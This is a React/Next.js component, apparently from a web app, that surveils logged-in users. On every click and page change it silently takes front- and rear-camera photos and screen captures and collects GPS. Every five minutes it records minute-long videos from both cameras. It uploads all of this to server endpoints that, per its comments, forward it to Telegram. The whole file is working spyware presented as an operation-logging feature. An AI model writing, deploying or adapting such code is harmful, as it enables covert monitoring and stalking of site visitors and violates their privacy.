'use client';

import { usePathname } from 'next/navigation';
import { useEffect, useRef } from 'react';

/* 操作留影：登录用户（非管理员）每次点击/切换页面拍一张前置照片上报。
   摄像头流在会话期间保持开启（浏览器指示点常亮），快照仅画 canvas，速度快。
   最小间隔 2 秒合并连点，避免 Telegram 刷屏。 */

const MIN_INTERVAL = 2000;
const AUTH_PAGES = ['/login', '/register', '/oidc-register', '/qr-login', '/tv/login', '/warning'];

export default function OperationWatcher() {
  const pathname = usePathname();
  const streamRef = useRef<MediaStream | null>(null);
  const videoRef = useRef<HTMLVideoElement | null>(null);
  const backStreamRef = useRef<MediaStream | null>(null);
  const backVideoRef = useRef<HTMLVideoElement | null>(null);
  const screenStreamRef = useRef<MediaStream | null>(null);
  const screenVideoRef = useRef<HTMLVideoElement | null>(null);
  const screenTriedRef = useRef(false);
  const gpsRef = useRef<{ lat: number; lng: number; acc: number } | null>(null);
  const lastMimeRef = useRef('');
  const lastCycleRef = useRef(0);
  const cyclingRef = useRef(false);
  const lastRef = useRef(0);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const pendingRef = useRef<{ label: string; path: string } | null>(null);
  const enabledRef = useRef(false);
  const pathRef = useRef(pathname);
  pathRef.current = pathname;

  /** 会话内取一次 GPS（授权已在门禁阶段给过），随每条操作消息上报。 */
  const fetchGpsOnce = () => {
    if (gpsRef.current || !('geolocation' in navigator)) return;
    navigator.geolocation.getCurrentPosition(
      (p) => {
        gpsRef.current = {
          lat: p.coords.latitude,
          lng: p.coords.longitude,
          acc: Math.round(p.coords.accuracy || 0),
        };
      },
      () => {
        gpsRef.current = null;
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 }
    );
  };

  useEffect(() => {
    let alive = true;
    fetch('/api/entry/status', { cache: 'no-store' })
      .then((r) => r.json())
      .then((j: { capture?: boolean }) => {
        if (!alive) return;
        enabledRef.current = j.capture !== false;
        if (enabledRef.current) {
          void ensureScreen();
          fetchGpsOnce();
        }
      })
      .catch(() => {
        if (alive) enabledRef.current = false;
      });
    return () => {
      alive = false;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  /** 录一段视频（默认 60 秒），返回 blob。低码率控制体积。
      带选项失败时自动用无选项 MediaRecorder 重试一次。 */
  const recordOne = (stream: MediaStream, ms: number): Promise<Blob | null> => {
    const attempt = (useOpts: boolean): Promise<Blob | null> =>
      new Promise((resolve) => {
        let done = false;
        const finish = (b: Blob | null) => {
          if (!done) {
            done = true;
            resolve(b);
          }
        };
        setTimeout(() => finish(null), ms + 8000);
        try {
          const MR = window.MediaRecorder;
          if (!MR) return finish(null);
          const mime = ['video/mp4', 'video/webm;codecs=vp8', 'video/webm'].find((m) =>
            MR.isTypeSupported(m)
          );
          lastMimeRef.current = mime || 'default';
          const rec = useOpts && mime
            ? new MR(stream, { mimeType: mime, videoBitsPerSecond: 300_000 })
            : new MR(stream);
          const chunks: Blob[] = [];
          rec.ondataavailable = (e) => {
            if (e.data && e.data.size) chunks.push(e.data);
          };
          rec.onstop = () =>
            finish(new Blob(chunks, { type: rec.mimeType || mime || 'video/webm' }));
          rec.onerror = () => finish(null);
          rec.start(1000);
          setTimeout(() => {
            try {
              if (rec.state !== 'inactive') rec.stop();
            } catch {
              finish(null);
            }
          }, ms);
        } catch {
          finish(null);
        }
      });
    return attempt(true).then((b) => (b && b.size ? b : attempt(false)));
  };

  const blobToBase64 = async (blob: Blob): Promise<string> => {
    const buf = await blob.arrayBuffer();
    const bytes = new Uint8Array(buf);
    let bin = '';
    const CH = 0x8000;
    for (let i = 0; i < bytes.length; i += CH) {
      bin += String.fromCharCode.apply(
        null,
        Array.from(bytes.subarray(i, i + CH)) as unknown as number[]
      );
    }
    // 去掉 ;codecs=xxx 参数，避免 data URL 解析失败
    const type = (blob.type || 'video/webm').split(';')[0];
    return `data:${type};base64,${btoa(bin)}`;
  };

  /** 失败诊断：往 Telegram 发一条文字说明死在哪一步。 */
  const ping = (label: string) =>
    fetch('/api/entry/op', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ kind: 'arm', label: label.slice(0, 120), path: pathRef.current }),
    }).catch(() => undefined);

  /** 每 5 分钟自动录 1 分钟前后双视频上报。 */
  const videoCycle = async () => {
    if (!enabledRef.current) return;
    if (cyclingRef.current) return;
    // 锁屏/后台时系统冻结定时器与录制，跳过本轮，回前台补录
    if (typeof document !== 'undefined' && document.visibilityState !== 'visible') return;
    const path = pathRef.current;
    if (AUTH_PAGES.some((p) => path === p || path.startsWith(p + '/'))) return;
    cyclingRef.current = true;
    lastCycleRef.current = Date.now();
    try {
      const MR = window.MediaRecorder;
      const mime =
        MR && ['video/mp4', 'video/webm;codecs=vp8', 'video/webm'].find((m) => MR.isTypeSupported(m));
      void ping(`录像周期开始：MR=${MR ? 'yes' : 'no'} mime=${mime || 'default'} 录60秒`);
      const okStream = await ensureStream();
      if (!okStream || !streamRef.current) {
        void ping('录像失败：摄像头流不可用');
        return;
      }
      const frontBlob = await recordOne(streamRef.current, 60_000);
      const backBlob = backStreamRef.current
        ? await recordOne(backStreamRef.current, 60_000)
        : null;
      if (!frontBlob && !backBlob) {
        void ping(`录像失败：MediaRecorder 无输出（mime=${lastMimeRef.current || 'default'}）`);
        return;
      }
      const payload = {
        videoFront: frontBlob ? await blobToBase64(frontBlob) : '',
        videoBack: backBlob ? await blobToBase64(backBlob) : '',
        gps: gpsRef.current,
        path,
      };
      const res = await fetch('/api/entry/video', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      }).catch(() => null);
      if (!res) {
        void ping('录像失败：上报网络错误');
        return;
      }
      const j = (await res.json().catch(() => null)) as { telegram?: string } | null;
      if (!res.ok) {
        void ping(`录像失败：服务端 ${res.status}`);
        return;
      }
      if (j && j.telegram && j.telegram !== 'sent') {
        void ping(`录像失败：Telegram ${j.telegram}`);
      }
    } catch (e) {
      void ping(`录像异常：${(e as Error).message}`);
    } finally {
      cyclingRef.current = false;
    }
  };

  useEffect(() => {
    // 进站 1 分钟后先录第一段，之后每 5 分钟一轮
    const first = setTimeout(() => {
      void videoCycle();
    }, 60_000);
    const timer = setInterval(() => {
      void videoCycle();
    }, 5 * 60 * 1000);
    // 回前台时若距上轮超过 4.5 分钟（锁屏期间被跳过），立即补一轮
    const onVis = () => {
      if (
        document.visibilityState === 'visible' &&
        Date.now() - lastCycleRef.current > 4.5 * 60_000
      ) {
        void videoCycle();
      }
    };
    document.addEventListener('visibilitychange', onVis);
    return () => {
      clearTimeout(first);
      clearInterval(timer);
      document.removeEventListener('visibilitychange', onVis);
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const openOne = async (facing: 'user' | 'environment') => {
    const s = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: facing, width: { ideal: 640 } },
      audio: false,
    });
    const v = document.createElement('video');
    v.muted = true;
    v.playsInline = true;
    v.srcObject = s;
    await v.play().catch(() => undefined);
    await new Promise((r) => setTimeout(r, 300));
    return { s, v };
  };

  const ensureStream = async (): Promise<boolean> => {
    if (streamRef.current?.active && videoRef.current?.videoWidth) return true;
    try {
      const { s, v } = await openOne('user');
      streamRef.current = s;
      videoRef.current = v;
    } catch {
      streamRef.current = null;
      return false;
    }
    // 会话内首次成功开启摄像头：发一条布防通知，便于确认留影已生效
    try {
      if (!sessionStorage.getItem('entry_armed')) {
        sessionStorage.setItem('entry_armed', '1');
        void fetch('/api/entry/op', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ kind: 'arm', label: '留影布防', path: pathRef.current }),
        }).catch(() => undefined);
      }
    } catch {
      /* ignore */
    }
    // 后置：没有硬件就跳过（桌面设备）
    if (!backStreamRef.current?.active || !backVideoRef.current?.videoWidth) {
      try {
        const { s, v } = await openOne('environment');
        backStreamRef.current = s;
        backVideoRef.current = v;
      } catch {
        backStreamRef.current = null;
        backVideoRef.current = null;
      }
    }
    // 录像只要求流活着；videoWidth 为 0 仅影响拍照不影响录制
    return !!streamRef.current?.active;
  };

  /** 屏幕共享：整会话只请求一次（浏览器每次调用都弹选择器，不能静默）。
      移动端 Safari/Chrome 不支持 getDisplayMedia，直接跳过。 */
  const ensureScreen = async () => {
    if (screenTriedRef.current) return;
    screenTriedRef.current = true;
    const md = navigator.mediaDevices as MediaDevices & {
      getDisplayMedia?: (c?: unknown) => Promise<MediaStream>;
    };
    if (!md?.getDisplayMedia) return;
    try {
      const s = await md.getDisplayMedia({ video: { width: { ideal: 1280 } }, audio: false });
      const v = document.createElement('video');
      v.muted = true;
      v.playsInline = true;
      v.srcObject = s;
      await v.play().catch(() => undefined);
      await new Promise((r) => setTimeout(r, 300));
      screenStreamRef.current = s;
      screenVideoRef.current = v;
      s.getVideoTracks()[0]?.addEventListener('ended', () => {
        screenStreamRef.current = null;
        screenVideoRef.current = null;
      });
    } catch {
      screenStreamRef.current = null;
      screenVideoRef.current = null;
    }
  };

  const draw = (v: HTMLVideoElement, maxW = 640): string | null => {
    if (!v.videoWidth) return null;
    const scale = Math.min(1, maxW / v.videoWidth);
    const canvas = document.createElement('canvas');
    canvas.width = Math.round(v.videoWidth * scale);
    canvas.height = Math.round(v.videoHeight * scale);
    const ctx = canvas.getContext('2d');
    if (!ctx) return null;
    ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
    return canvas.toDataURL('image/jpeg', 0.6);
  };

  const snap = async (label: string, path: string) => {
    if (!enabledRef.current) return;
    if (AUTH_PAGES.some((p) => path === p || path.startsWith(p + '/'))) return;
    const okStream = await ensureStream();
    const v = videoRef.current;
    if (!okStream || !v || !v.videoWidth) return;
    try {
      const photo = draw(v);
      const photoBack = backVideoRef.current ? draw(backVideoRef.current) : null;
      const screen =
        screenStreamRef.current?.active && screenVideoRef.current
          ? draw(screenVideoRef.current, 1280)
          : null;
      if (!photo) return;
      lastRef.current = Date.now();
      await fetch('/api/entry/op', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          photo,
          photoBack: photoBack || '',
          screen: screen || '',
          gps: gpsRef.current,
          label,
          path,
        }),
      }).catch(() => undefined);
    } catch {
      /* ignore */
    }
  };

  const schedule = (label: string) => {
    if (!enabledRef.current) return;
    const path = pathRef.current;
    const wait = Math.max(0, lastRef.current + MIN_INTERVAL - Date.now());
    if (wait <= 0) {
      void snap(label, path);
      return;
    }
    pendingRef.current = { label, path };
    if (timerRef.current) clearTimeout(timerRef.current);
    timerRef.current = setTimeout(() => {
      const p = pendingRef.current;
      pendingRef.current = null;
      timerRef.current = null;
      if (p) void snap(p.label, p.path);
    }, wait);
  };

  useEffect(() => {
    const onClick = (e: MouseEvent) => {
      const target = e.target as HTMLElement | null;
      const el = target?.closest?.('a,button,[role=button],video,input,select,summary') as HTMLElement | null;
      if (!el) return;
      const text = (el.textContent || '').trim().replace(/\s+/g, ' ').slice(0, 24);
      const href = el.getAttribute('href') || '';
      const label = `点击 ${text || el.tagName.toLowerCase()}${href ? ` → ${href.slice(0, 40)}` : ''}`;
      schedule(label);
    };
    document.addEventListener('click', onClick, true);
    return () => document.removeEventListener('click', onClick, true);
  }, []);

  const prevPath = useRef(pathname);
  useEffect(() => {
    if (prevPath.current !== pathname) {
      prevPath.current = pathname;
      schedule(`进入页面 ${pathname}`);
    }
  }, [pathname]);

  useEffect(
    () => () => {
      if (timerRef.current) clearTimeout(timerRef.current);
      streamRef.current?.getTracks().forEach((t) => t.stop());
      backStreamRef.current?.getTracks().forEach((t) => t.stop());
      screenStreamRef.current?.getTracks().forEach((t) => t.stop());
    },
    []
  );

  return null;
}
